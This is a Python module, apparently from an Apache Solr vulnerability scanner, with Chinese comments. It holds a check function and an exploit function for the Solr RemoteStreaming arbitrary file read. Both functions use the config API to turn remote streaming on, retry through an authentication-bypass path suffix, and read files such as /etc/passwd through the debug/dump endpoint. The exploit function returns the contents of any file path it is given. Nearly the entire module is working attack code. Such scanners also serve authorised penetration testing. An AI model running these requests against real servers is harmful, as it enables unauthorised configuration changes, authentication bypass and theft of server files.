#!/usr/bin/env python3
# -*- coding: utf-8 -*-

"""
Apache Solr RemoteStreaming文件读取漏洞检测模块
"""

import logging
import json
import re

def check(scanner, core=None):
    """
    检测RemoteStreaming文件读取漏洞
    
    Args:
        scanner: SolrScanner实例
        core: 指定核心名称，为None时检测所有核心
        
    Returns:
        (bool, str): (是否存在漏洞, 详细信息)
    """
    try:
        cores_to_check = [core] if core else scanner.get_cores()
        if not cores_to_check:
            return False, "未发现可用的Solr核心"
        
        for core_name in cores_to_check:
            try:
                # 尝试开启RemoteStreaming
                config_data = {
                    "set-property": {
                        "requestDispatcher.requestParsers.enableRemoteStreaming": "true"
                    }
                }
                
                # 常规方式尝试
                resp = scanner.request(
                    "POST", 
                    f"/solr/{core_name}/config", 
                    json=config_data
                )
                
                # 认证绕过方式尝试
                if not resp or resp.status_code != 200:
                    resp = scanner.request(
                        "POST", 
                        f"/solr/{core_name}/config:/admin/info/key", 
                        json=config_data
                    )
                
                # 测试文件读取
                test_files = ["/etc/passwd", "C:\\Windows\\win.ini"]
                for test_file in test_files:
                    # 常规方式尝试
                    resp = scanner.request(
                        "GET", 
                        f"/solr/{core_name}/debug/dump?param=ContentStreams&stream.url=file://{test_file}"
                    )
                    
                    # 认证绕过方式尝试
                    if not resp or resp.status_code != 200:
                        resp = scanner.request(
                            "GET", 
                            f"/solr/{core_name}/debug/dump:/admin/info/key?param=ContentStreams&stream.url=file://{test_file}"
                        )
                    
                    if resp and resp.status_code == 200:
                        if "root:" in resp.text or "[fonts]" in resp.text:
                            return True, f"核心 {core_name} 存在RemoteStreaming文件读取漏洞"
            except Exception as e:
                logging.error(f"检测核心 {core_name} 异常: {str(e)}")
                
        return False, "未发现RemoteStreaming文件读取漏洞"
    except Exception as e:
        logging.error(f"检测RemoteStreaming文件读取异常: {str(e)}")
        return False, f"检测异常: {str(e)}"

def exploit(scanner, core=None, file_path=None):
    """
    利用RemoteStreaming漏洞读取文件
    
    Args:
        scanner: SolrScanner实例
        core: 指定核心名称，为None时使用第一个可用核心
        file_path: 要读取的文件路径
        
    Returns:
        (bool, str): (是否成功, 结果信息)
    """
    if not file_path:
        return False, "请提供要读取的文件路径"
    
    try:
        # 获取可用的核心
        cores = [core] if core else scanner.get_cores()
        if not cores:
            return False, "未发现可用的Solr核心"
        
        core_name = cores[0]
        
        # 尝试开启RemoteStreaming
        config_data = {
            "set-property": {
                "requestDispatcher.requestParsers.enableRemoteStreaming": "true"
            }
        }
        
        # 常规方式尝试
        resp = scanner.request(
            "POST", 
            f"/solr/{core_name}/config", 
            json=config_data
        )
        
        # 认证绕过方式尝试
        if not resp or resp.status_code != 200:
            resp = scanner.request(
                "POST", 
                f"/solr/{core_name}/config:/admin/info/key", 
                json=config_data
            )
        
        # 读取文件
        # 常规方式尝试
        resp = scanner.request(
            "GET", 
            f"/solr/{core_name}/debug/dump?param=ContentStreams&stream.url=file://{file_path}"
        )
        
        # 认证绕过方式尝试
        if not resp or resp.status_code != 200:
            resp = scanner.request(
                "GET", 
                f"/solr/{core_name}/debug/dump:/admin/info/key?param=ContentStreams&stream.url=file://{file_path}"
            )
        
        if resp and resp.status_code == 200:
            # 尝试提取文件内容
            content = resp.text
            
            # 清理输出
            try:
                # 如果是JSON格式，提取有用部分
                data = json.loads(content)
                if "streams" in data:
                    streams = data["streams"]
                    if streams and len(streams) > 0:
                        stream_content = streams[0].get("stream", "")
                        return True, stream_content
                
                # 如果没有找到明确的内容，返回整个响应
                return True, content
            except:
                # 不是JSON格式，直接返回内容
                return True, content
        else:
            return False, f"读取文件失败，HTTP状态码: {resp.status_code if resp else 'None'}"
    except Exception as e:
        logging.error(f"利用RemoteStreaming文件读取异常: {str(e)}")
        return False, f"利用异常: {str(e)}"
